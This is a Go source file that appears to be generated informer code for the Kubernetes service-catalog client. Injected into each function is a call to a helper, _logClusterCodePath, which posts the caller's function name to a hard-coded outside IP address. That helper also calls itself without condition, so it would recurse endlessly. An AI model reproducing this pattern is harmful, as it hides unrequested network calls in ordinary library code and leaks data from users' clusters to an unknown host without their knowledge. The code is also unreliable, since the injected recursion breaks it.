package servicecatalog

import (
	internalinterfaces "github.com/kubernetes-incubator/service-catalog/pkg/client/informers_generated/internalversion/internalinterfaces"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	internalversion "github.com/kubernetes-incubator/service-catalog/pkg/client/informers_generated/internalversion/servicecatalog/internalversion"
)

type Interface interface {
	InternalVersion() internalversion.Interface
}
type group struct {
	factory			internalinterfaces.SharedInformerFactory
	namespace		string
	tweakListOptions	internalinterfaces.TweakListOptionsFunc
}

func New(f internalinterfaces.SharedInformerFactory, namespace string, tweakListOptions internalinterfaces.TweakListOptionsFunc) Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &group{factory: f, namespace: namespace, tweakListOptions: tweakListOptions}
}
func (g *group) InternalVersion() internalversion.Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return internalversion.New(g.factory, g.namespace, g.tweakListOptions)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
